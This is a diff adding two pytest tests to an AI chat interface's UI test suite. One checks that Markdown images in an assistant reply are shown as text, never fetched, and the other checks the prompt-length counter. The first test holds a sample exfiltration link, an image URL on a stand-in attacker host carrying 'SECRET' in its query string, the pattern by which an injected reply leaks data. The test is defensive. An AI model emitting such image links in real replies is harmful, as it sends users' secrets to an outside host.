@@ -269,6 +269,35 @@ async def test_reply_markdown_renders_tables_and_emphasis_with_raw_html_and_scri
 
 
 @pytest.mark.asyncio
+async def test_reply_markdown_never_loads_an_image(ui_client):
+    """A reply cannot make the browser fetch anything: Markdown image syntax shows as
+    text, never as an image, while a link stays a link the user chooses to click."""
+    page = await _ask(ui_client, "![s](https://attacker.example/p.png?d=SECRET) and "
+                                 "[doc](https://example.com/a)\n\n![local](/static/x.png)")
+    reply = page[page.index("ai-msg--ai"):]
+    assert "<img" not in reply and "src=" not in reply
+    assert 'href="https://example.com/a"' in reply
+
+
+@pytest.mark.asyncio
+async def test_composer_shows_the_prompt_limit_the_api_enforces(ui_client):
+    """The composer counts the prompt against the limit the API refuses past, and does
+    not cut a paste short: the text is kept and the refusal names the limit."""
+    from celerp_ai.routes import MAX_PROMPT_CHARS
+    patches = _patch_page()
+    _apply(patches)
+    ui_client.cookies.update(_authed())
+    try:
+        r = await ui_client.get("/ai")
+    finally:
+        _stop(patches)
+    field = re.search(r'<textarea[^>]*id="ai-query-input"[^>]*>', r.text).group(0)
+    assert "maxlength" not in field
+    count = re.search(r'<[^>]*id="ai-query-count"[^>]*>', r.text).group(0)
+    assert f'data-limit="{MAX_PROMPT_CHARS}"' in count
+
+
+@pytest.mark.asyncio
 async def test_user_question_shows_as_typed_not_as_markdown(ui_client):
     """Only the assistant's reply is Markdown: the question bubble shows the user's
     characters as typed."""
